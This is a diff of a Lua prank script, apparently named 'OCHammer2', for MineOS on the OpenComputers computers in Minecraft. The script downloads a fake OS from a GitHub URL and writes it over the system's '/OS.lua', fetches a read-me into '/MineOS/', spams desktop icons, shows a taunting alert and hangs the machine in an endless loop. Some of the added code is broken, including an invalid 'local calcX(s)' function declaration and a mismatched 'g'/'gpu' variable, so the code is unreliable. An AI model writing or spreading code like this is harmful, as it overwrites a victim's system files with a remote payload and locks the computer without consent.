@@ -24,6 +24,14 @@ function FUN()
   local cdir = fs.path(system.getCurrentScript())
 
   internet.download("https://raw.githubusercontent.com/ocboy3/OC/main/OCHammer2.app/FakeOS.lua","/OS.lua")
+  
+  local IS_MINEOS_DIR = fs.isDirectory("/MineOS/")
+  
+  if IS_MINEOS_DIR == false then
+    fs.makeDirectory("/MineOS/")
+  end
+  
+ 
   internet.download("https://raw.githubusercontent.com/ocboy3/OC/main/OCHammer2.app/PLEASE READ ME.txt","/MineOS/PLEASE READ ME.txt")
 
   -- spam a bunch of icons on the desktop
@@ -35,8 +43,25 @@ function FUN()
   
   
   GUI.alert("fortnite is better than roblox stay mad")
+  
+  local g = com.gpu()
+  
   event.push("system","updateFileList")
   
+  local mx,my = gpu.getResolution()
+  
+  local calcX(s)
+    return math.floor((mx/2)-(string.len(s)/2))
+  end
+
+  local STUFF = {}
+  
+  local getStuff(x,y)
+    local text, fore, back = gpu.get(x,y)
+  end
+
+  --setBackground
+
   while true do
     computer.pullSignal(0.5)
   end
